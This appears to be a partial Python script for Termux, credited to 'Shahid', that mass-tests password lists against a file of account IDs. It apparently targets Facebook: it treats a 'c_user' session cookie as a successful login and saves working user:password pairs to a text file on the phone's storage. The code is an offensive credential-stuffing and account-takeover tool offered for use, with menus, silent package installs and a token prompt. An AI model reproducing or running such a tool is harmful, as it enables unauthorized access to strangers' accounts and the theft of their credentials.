import os,sys
try: import requests
except ModuleNotFoundError:print("Shahid Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("Shahid Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("Shahid Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
...
def line_chack_dote():
	...
	for b in range(2):
		for t in m:
				sys.stdout.write("\r[â™¡] Creating TNL Internet File " + t)
	sys.stdout.flush()
	time.sleep(0.1)
...
def R():
			os.system("clear")
			logo()
			print("               \033[1;92mâ™¡ CODDER Mr âžµ SHAHIDðŸ’”ðŸ¥° \033[1;92m")
			print (' \033[1;92mâ™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡')
			print (" [â™¡] CREDIT \033[1;92mâžµ TERMUX-TEAM \033[1;92m")
			print(" [â™¡] FRIEND  \033[1;92mâžµ I DONOT BE HAVE  \033[1;92m")
			print (' \033[1;92mâ™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡')
			print(" [1] Start Cloning(SHAHID BASHIR ")
			print(" [2] Create File")
			print(" [3] FeedBack")
			print(" [4] WhatsApp Group")
			print (" [0] Exit Programing")
			print (' \033[1;92mâ™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡')
			key = input(" [â™¡] Choose âžµ ")
			print (' \033[1;92mâ™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡')
			if key in [""]:
				print (" [â™¡] Please Select Correct Option")
				exit()
			elif key in ["1", "01"]:
				time.sleep(0.5)
				__crack__().plerr()
...
def login():
	...
	tok = input(' [*] Enter Your Token âžµ ')
	try:
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		print('\n\033[1;92mTotal OK âžµ %s â€¢  Total CP âžµ %s'%(str(len(ok)),str(len(cp))));exit()
...
class __crack__:
	...
	def plerr(self):
		try:
			self.apk = input(" [â™¡] FILE LAG BC  âžµ ")
			print (' \033[1;94mâ™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡')
			self.id = open(self.apk).read().splitlines()
			print(' [â™¡] Total ID âžµ %s'%(len(self.id)))
			print (' \033[1;94mâ™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡')
			print('\033[1;34m [â™¡]\033[1;34m  Please Choose Pass Method\033[1;37m')
			print (' \033[1;94mâ™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡â™¡')
		except:
			print('\n [â™¡] ABY LOWDE DEKH K LAGA SAI FILE  STROGAE SY')
			input('\n [â™¡] Press Enter To Back');R()
     
		self.__pler__()
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;94m [SHAHID] %s/%s  \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[JAIKUMAR-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/JAIKUMAR_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
		...
		loop += 1
	def __pler__(self):
		print ("\033[1;34m [1] Auto 2 Pass (Fast) ")
